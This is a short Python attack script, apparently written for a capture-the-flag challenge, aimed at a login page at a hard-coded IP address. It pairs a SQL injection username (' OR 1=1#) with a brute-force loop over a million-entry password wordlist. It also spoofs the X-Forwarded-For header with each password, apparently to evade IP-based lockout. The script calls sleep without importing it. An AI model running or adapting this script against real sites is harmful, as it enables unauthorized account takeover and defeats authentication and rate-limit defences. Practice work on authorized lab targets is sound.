#!/usr/bin/python3
import re
import requests

def open_ressources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]

host = 'http://34.94.3.143/2a8424d1a1'
login_url = host + '/login'
username = '%27+OR+1%3D1%23'
wordlist = open_ressources('/media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/Credentials/10-million-password-list-top-1000000.txt')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'username': username,
        'password': password
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = True)

    if 'location' in login_result.headers:
        if '/home' in login_result.headers['location']:
            print('\nSUCCESS: Password found!')
            print('Use {p} to login.'.format(p = password))
            print()
            break
    sleep(0.5)
